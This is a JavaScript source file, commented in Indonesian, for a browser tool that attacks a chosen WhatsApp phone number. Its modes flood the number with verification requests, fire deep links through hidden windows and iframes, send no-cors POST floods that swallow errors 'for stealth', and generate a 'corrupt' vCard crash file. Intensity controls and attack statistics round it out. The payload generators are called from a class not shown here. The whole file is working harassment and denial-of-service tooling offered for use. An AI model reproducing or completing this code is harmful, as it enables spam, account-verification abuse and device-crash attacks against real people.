// Attack Engine Utama
class WhatsAppAttackEngine {
    constructor() {
        this.core = null;
        this.isRunning = false;
        this.attackStats = {
            sent: 0,
            success: 0,
            failed: 0,
            startTime: null
        };
        this.workers = [];
    }
    
    // Inisialisasi dengan nomor target
    initialize(targetNumber) {
        if(!this.core || this.core.phone !== targetNumber) {
            this.core = new WhatsAppAttackCore(targetNumber);
        }
        
        if(!this.core.validatePhoneNumber(targetNumber)) {
            throw new Error("Nomor telepon tidak valid. Format: 62xxxxxxxxxx");
        }
        
        CONFIG.targetNumber = targetNumber;
        APP_STATE.currentTarget = targetNumber;
        
        this.log(`System initialized for target: ${targetNumber}`);
        return true;
    }
    
    // Mulai serangan
    async startAttack(mode = 'multi_attack') {
        if(this.isRunning) {
            this.log("Serangan sudah berjalan", "warning");
            return;
        }
        
        if(!this.core) {
            throw new Error("System belum diinisialisasi. Set target terlebih dahulu.");
        }
        
        this.isRunning = true;
        APP_STATE.isAttacking = true;
        this.attackStats.startTime = Date.now();
        
        this.updateStatus("MENYERANG");
        this.log(`Memulai serangan terhadap: ${this.core.phone}`);
        this.log(`Mode: ${mode}`);
        
        try {
            switch(mode) {
                case 'verifikasi_bomb':
                    await this.executeVerificationBomb();
                    break;
                    
                case 'deeplink_flood':
                    await this.executeDeepLinkFlood();
                    break;
                    
                case 'vcard_corrupt':
                    this.generateAndDownloadVCard();
                    break;
                    
                case 'multi_attack':
                default:
                    await this.executeMultiAttack();
                    break;
            }
            
            this.log("Serangan selesai", "success");
            
        } catch(error) {
            this.log(`Error: ${error.message}`, "error");
        } finally {
            this.stopAttack();
        }
    }
    
    // Eksekusi Bom Verifikasi
    async executeVerificationBomb() {
        const payloads = this.core.generateVerificationBomb();
        const intensity = CONFIG.intensityLevels[APP_STATE.intensity];
        
        this.log(`Menjalankan Bom Verifikasi (${payloads.length} payloads)`);
        
        for(let i = 0; i < payloads.length && this.isRunning; i++) {
            const payload = payloads[i];
            
            try {
                await this.executePayload(payload);
                this.attackStats.sent++;
                
                // Update UI setiap 10 request
                if(this.attackStats.sent % 10 === 0) {
                    this.updateStats();
                }
                
                // Delay berdasarkan intensitas
                await this.delay(intensity.delay);
                
            } catch(error) {
                this.attackStats.failed++;
            }
        }
    }
    
    // Eksekusi Deep Link Flood
    async executeDeepLinkFlood() {
        const links = this.core.generateDeepLinkCorrupt();
        const intensity = CONFIG.intensityLevels[APP_STATE.intensity];
        
        this.log(`Menjalankan Deep Link Flood (${links.length} links)`);
        
        for(let i = 0; i < links.length && this.isRunning; i++) {
            const link = links[i];
            
            try {
                if(link.type === 'android_intent' || link.type === 'ios_urlscheme') {
                    // Buka deep link di window hidden
                    this.openHiddenWindow(link.payload);
                }
                
                this.attackStats.sent++;
                
                if(this.attackStats.sent % 5 === 0) {
                    this.updateStats();
                }
                
                await this.delay(intensity.delay * 0.8);
                
            } catch(error) {
                this.attackStats.failed++;
            }
        }
    }
    
    // Eksekusi Multi Attack
    async executeMultiAttack() {
        const intensity = CONFIG.intensityLevels[APP_STATE.intensity];
        
        // Jalankan semua serangan secara paralel
        const attacks = [
            this.executeVerificationBomb(),
            this.executeDeepLinkFlood(),
            this.executeAPIFlood()
        ];
        
        this.log("Memulai Serangan Multi-Vektor");
        
        // Jalankan serangan API di background
        this.executeAPIFlood().catch(() => {});
        
        await Promise.all(attacks.slice(0, 2));
        
        // Generate VCard setelah serangan utama
        if(this.isRunning) {
            this.generateAndDownloadVCard();
        }
    }
    
    // Eksekusi API Flood
    async executeAPIFlood() {
        const payloads = this.core.generateAPIFloodPayloads();
        const intensity = CONFIG.intensityLevels[APP_STATE.intensity];
        
        this.log(`Memulai API Flood (${payloads.length} requests)`);
        
        for(let i = 0; i < payloads.length && this.isRunning; i++) {
            const payload = payloads[i];
            
            try {
                if(payload.method === 'POST') {
                    await this.sendPostRequest(payload);
                }
                
                this.attackStats.sent++;
                
                if(this.attackStats.sent % 20 === 0) {
                    this.log(`API Flood progress: ${i+1}/${payloads.length}`, "info");
                }
                
                await this.delay(intensity.delay * 0.5);
                
            } catch(error) {
                this.attackStats.failed++;
            }
        }
    }
    
    // ===== EXECUTION METHODS =====
    
    async executePayload(payload) {
        return new Promise((resolve, reject) => {
            try {
                if(payload.method === 'DEEPLINK') {
                    this.openHiddenWindow(payload.url);
                    resolve();
                    return;
                }
                
                // Gunakan iframe untuk request
                const iframe = document.createElement('iframe');
                iframe.style.cssText = 'display:none;width:0;height:0;border:0;';
                iframe.srcdoc = `
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <meta http-equiv="refresh" content="0;url='${payload.url}'">
                    </head>
                    <body></body>
                    </html>
                `;
                
                document.body.appendChild(iframe);
                
                setTimeout(() => {
                    if(iframe.parentNode) {
                        document.body.removeChild(iframe);
                    }
                    resolve();
                }, 100);
                
            } catch(error) {
                reject(error);
            }
        });
    }
    
    openHiddenWindow(url) {
        const features = 'width=1,height=1,left=9999,top=9999,toolbar=no,menubar=no,scrollbars=no';
        
        try {
            // Coba buka window
            const win = window.open(url, '_blank', features);
            
            // Tutup setelah 100ms
            setTimeout(() => {
                if(win && !win.closed) {
                    try {
                        win.close();
                    } catch(e) {
                        // Ignore
                    }
                }
            }, 100);
            
        } catch(error) {
            // Fallback ke iframe
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'display:none;width:0;height:0;border:0;';
            iframe.src = url;
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                if(iframe.parentNode) {
                    document.body.removeChild(iframe);
                }
            }, 100);
        }
    }
    
    async sendPostRequest(payload) {
        // Gunakan fetch dengan mode no-cors untuk bypass CORS
        return fetch(payload.url, {
            method: payload.method,
            headers: payload.headers,
            body: payload.body,
            mode: 'no-cors',
            credentials: 'omit'
        }).catch(() => {
            // Ignore errors untuk stealth
        });
    }
    
    // ===== UTILITIES =====
    
    generateAndDownloadVCard() {
        if(!this.core) return;
        
        const vcard = this.core.generateCorruptVCard();
        const filename = `crash_${this.core.phone}_${Date.now()}.vcf`;
        
        this.core.createDownloadFile(filename, vcard);
        this.log(`File VCard corrupt dibuat: ${filename}`, "success");
    }
    
    stopAttack() {
        this.isRunning = false;
        APP_STATE.isAttacking = false;
        
        // Hentikan semua workers
        this.workers.forEach(worker => {
            if(worker && worker.terminate) {
                worker.terminate();
            }
        });
        this.workers = [];
        
        this.updateStatus("BERHENTI");
        
        // Tampilkan statistik
        const successRate = this.attackStats.sent > 0 
            ? Math.round((this.attackStats.success / this.attackStats.sent) * 100)
            : 0;
        
        this.log(`=== SERANGAN SELESAI ===`, "info");
        this.log(`Total Request: ${this.attackStats.sent}`, "info");
        this.log(`Berhasil: ${this.attackStats.success}`, "success");
        this.log(`Gagal: ${this.attackStats.failed}`, "error");
        this.log(`Success Rate: ${successRate}%`, "info");
        
        // Reset stats untuk serangan berikutnya
        this.attackStats = {
            sent: 0,
            success: 0,
            failed: 0,
            startTime: null
        };
    }
    
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    
    updateStatus(status) {
        const statusDot = document.getElementById('statusDot');
        const statusText = document.getElementById('statusText');
        
        statusText.textContent = status;
        
        switch(status) {
            case 'SIAP':
                statusDot.className = 'status-dot ready';
                break;
            case 'MENYERANG':
                statusDot.className = 'status-dot attacking';
                break;
            case 'BERHENTI':
                statusDot.className = 'status-dot stopped';
                break;
            default:
                statusDot.className = 'status-dot';
        }
    }
    
    updateStats() {
        document.getElementById('requestCount').textContent = this.attackStats.sent;
        
        // Update waktu aktif
        if(this.attackStats.startTime) {
            const seconds = Math.floor((Date.now() - this.attackStats.startTime) / 1000);
            const mins = Math.floor(seconds / 60);
            const secs = seconds % 60;
            document.getElementById('activeTime').textContent = 
                `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
        }
        
        // Update success rate
        const successRate = this.attackStats.sent > 0 
            ? Math.round((this.attackStats.success / this.attackStats.sent) * 100)
            : 0;
        document.getElementById('successRate').textContent = `${successRate}%`;
        
        // Update target aktif
        document.getElementById('currentTarget').textContent = 
            this.core ? this.core.phone : '-';
    }
    
    log(message, type = 'info') {
        const logContainer = document.getElementById('logContainer');
        const time = new Date().toLocaleTimeString();
        
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry ${type}`;
        logEntry.innerHTML = `
            <span class="log-time">[${time}]</span>
            <span class="log-message">${message}</span>
        `;
        
        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
        
        // Update statistik berdasarkan tipe log
        if(type === 'success') this.attackStats.success++;
        
        // Update UI stats
        this.updateStats();
    }
}

// ===== GLOBAL INSTANCE & EVENT HANDLERS =====
const attackEngine = new WhatsAppAttackEngine();

// Event Listeners
document.addEventListener('DOMContentLoaded', function() {
    // Update intensity value display
    const intensitySlider = document.getElementById('intensity');
    const intensityValue = document.getElementById('intensityValue');
    
    intensitySlider.addEventListener('input', function() {
        intensityValue.textContent = this.value;
        APP_STATE.intensity = parseInt(this.value);
    });
    
    // Option cards selection
    document.querySelectorAll('.option-card').forEach(card => {
        card.addEventListener('click', function() {
            // Remove selected class from all cards
            document.querySelectorAll('.option-card').forEach(c => {
                c.classList.remove('selected');
            });
            
            // Add selected class to clicked card
            this.classList.add('selected');
            
            // Update attack type
            const option = this.dataset.option;
            const attackType = document.getElementById('attackType');
            
            switch(option) {
                case 'verifikasi':
                    attackType.value = 'verifikasi_bomb';
                    break;
                case 'deeplink':
                    attackType.value = 'deeplink_flood';
                    break;
                case 'vcard':
                    attackType.value = 'vcard_corrupt';
                    break;
                case 'api':
                    attackType.value = 'multi_attack';
                    break;
            }
        });
    });
    
    // Start button
    document.getElementById('startBtn').addEventListener('click', async function() {
        const targetNumber = document.getElementById('targetNumber').value.trim();
        const attackType = document.getElementById('attackType').value;
        
        if(!targetNumber) {
            attackEngine.log("Masukkan nomor target terlebih dahulu!", "error");
            return;
        }
        
        try {
            // Initialize engine
            attackEngine.initialize(targetNumber);
            
            // Start attack
            await attackEngine.startAttack(attackType);
            
        } catch(error) {
            attackEngine.log(`Error: ${error.message}`, "error");
        }
    });
    
    // Stop button
    document.getElementById('stopBtn').addEventListener('click', function() {
        attackEngine.stopAttack();
        attackEngine.log("Serangan dihentikan oleh user", "warning");
    });
    
    // Generate VCard button
    document.getElementById('generateBtn').addEventListener('click', function() {
        const targetNumber = document.getElementById('targetNumber').value.trim();
        
        if(!targetNumber) {
            attackEngine.log("Masukkan nomor target terlebih dahulu!", "error");
            return;
        }
        
        try {
            attackEngine.initialize(targetNumber);
            attackEngine.generateAndDownloadVCard();
        } catch(error) {
            attackEngine.log(`Error: ${error.message}`, "error");
        }
    });
    
    // Clear log button
    document.getElementById('clearBtn').addEventListener('click', function() {
        const logContainer = document.getElementById('logContainer');
        logContainer.innerHTML = `
            <div class="log-entry info">
                <span class="log-time">[${new Date().toLocaleTimeString()}]</span>
                <span class="log-message">Log dibersihkan</span>
            </div>
        `;
    });
    
    // Auto-select first option
    document.querySelector('.option-card').classList.add('selected');
});
